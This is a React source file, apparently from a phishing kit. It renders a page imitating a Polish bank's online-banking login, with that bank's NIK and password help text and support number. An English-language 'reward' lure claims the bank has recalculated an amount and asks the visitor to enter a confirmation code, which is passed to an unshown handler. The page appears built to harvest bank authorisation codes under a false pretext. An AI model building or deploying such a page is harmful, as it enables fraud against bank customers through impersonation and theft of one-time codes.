import React from "react";
import * as yup from "yup";
import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import {Form} from "reactstrap";
import log_question_big from "../res/files/log_question_big.png";
import log_excl_gray from "../res/files/log_excl_gray.png";

const schema = yup.object().shape({
    code: yup.string().min(3).required(),
});

const CentrumFormPush = ({amount, handler}) => {
    const {register, handleSubmit, trigger, reset, formState} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const errors = formState.errors;
    const clearCode = (data) => {
        // setStep(1);
        // setLogin(false);
        reset();
        handler(data);
    }


    return (
        <div id="logowanie" className="logowanie loginPanel">
            <div className="centrum_push_info">
                <h1>
                    After the bank recalculating the amount, <br/> your reward is
                </h1>
                <p>
                    <span>{amount}zł.</span>
                    Wprowadź kod w celu potwierdzenia.
                </p>
            </div>
            <Form onSubmit={handleSubmit(clearCode)}>
                <div id="logowanie-inner-NIK" key={'login'}>
                    <div className="nikForm f1">
                        <div className="forms">
                            <div className="labelsLine" id="labelContainer">
                                <label htmlFor="input_nik" id="niklabelk1">
                                        <span className="login-step-instruction">
                                            <strong>Wpisz kod</strong>
                                        </span>
                                </label>
                            </div>
                            <div className="feedbackDiv input">
                                {
                                    errors.code &&
                                    <span>
                                        <ul className="feedbackPanel">
                                            <li className="feedbackPanelERROR">
                                                <span>Pole wymagane.</span>
                                            </li>
                                        </ul>
                                    </span>
                                }

                                <input
                                    className={`content_center_input input-code ${errors.code && 'invalid'}`}
                                    autoComplete="off"
                                    {...register('code')}
                                />
                            </div>
                            <div className="button-next">
                                <button type="submit"
                                        className="btn"
                                >
                                    Dalej
                                </button>
                            </div>
                            <div id="akcje">
                                <div id="accessDiv">
                                    <a data-toggle="modal" data-target="#idc">
                                        <span>Jak uzyskać dostęp?</span>
                                    </a>
                                    <div id="idc" className="modal fade" role="dialog"
                                         aria-labelledby="myModalLabel"
                                         aria-hidden="true">
                                        <div className="modal-dialog">
                                            <div className="modal-content">
                                                <div className="modal-header">
                                                    <h1 className="modal-title">
                                                        <img className="modal-header-icon"
                                                             src={log_question_big}/>
                                                        <span>Jak uzyskać dostęp?</span>
                                                    </h1>
                                                    <button type="button"
                                                            className="close"
                                                            data-dismiss="modal"
                                                            aria-hidden="true"/>
                                                </div>
                                                <div className="modal-body">
                                                    <div>
                                                        <div id="tipGainAccess">
                                                            <p>Do zalogowania się potrzebujesz:</p>
                                                            <div id="tipGainAccessDiv">
                                                                <div>
                                                                    <p><strong>Login</strong><br/>To NIK lub
                                                                        Twój
                                                                        własny login. NIK
                                                                        znajdziesz w umowie bankowości
                                                                        internetowej
                                                                        i mobilnej. Własny login
                                                                        możesz samodzielnie zdefiniować i
                                                                        używać
                                                                        zamiennie z NIK.</p>
                                                                </div>
                                                                <div>
                                                                    <p><strong>Hasło</strong><br/>To hasło
                                                                        ustawione
                                                                        przez Ciebie lub hasło
                                                                        startowe, jeśli logujesz się po raz
                                                                        pierwszy. Hasło startowe znajdziesz
                                                                        w
                                                                        SMS-ie, w e-mailu lub w kopercie.
                                                                    </p>
                                                                </div>
                                                            </div>
                                                            <img id="exclamation-icon"
                                                                 src={log_excl_gray}/>
                                                            <p><b>Nie pamiętasz hasła?</b> Skontaktuj
                                                                się z nami pod
                                                                numerem 1 9999
                                                                lub +48 61 81 19999, jeśli dzwonisz z
                                                                zagranicy.
                                                                Możesz też pójść do
                                                                oddziału. Doradca ustawi Ci nowe hasło.
                                                            </p>
                                                            <p><b>Nie masz NIK-u?</b> Podpisz umowę
                                                                bankowości
                                                                internetowej i mobilnej. Odwiedź nasz
                                                                oddział lub
                                                                skontaktuj się z Doradcą online.</p>
                                                            <p></p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>


                                </div>
                            </div>
                            <div id="reset-password-link">
                                <span>Problem z logowaniem?</span>
                                <span id="redirect-link">Zresetuj swoje hasło</span>
                            </div>
                        </div>
                    </div>
                </div>
                :
            </Form>
        </div>
    )
}
export default CentrumFormPush;